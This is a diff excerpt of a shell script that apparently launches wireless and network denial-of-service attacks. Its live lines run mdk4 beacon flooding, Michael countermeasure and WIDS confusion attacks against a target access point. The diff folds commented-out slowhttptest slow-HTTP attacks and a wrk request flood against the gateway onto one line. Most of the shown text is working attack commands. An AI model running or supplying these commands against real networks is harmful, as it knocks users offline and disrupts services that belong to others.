@@ -15,11 +15,7 @@ sudo mdk4 wlan0mon f -s a -m s -p 1000 &
 sudo mdk4 wlan0mon m -t $BSSID &
 sudo mdk4 wlan0mon w -e $SSID &
 
-# slowhttptest -H -c 65539 -l $TIMEOUT -u $GATEWAY &
-# slowhttptest -B -c 65539 -l $TIMEOUT -u $GATEWAY &
-# slowhttptest -R -c 65539 -l $TIMEOUT -u $GATEWAY &
-# slowhttptest -X -c 65539 -l $TIMEOUT -u $GATEWAY &
-# wrk $GATEWAY -c 100000 -d 60 -t 4 &
+# slowhttptest -H -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -B -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -R -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -X -c 65539 -l $TIMEOUT -u $GATEWAY & wrk $GATEWAY -c 100000 -d 60 -t 4 &
 
 sleep $TIMEOUT
 
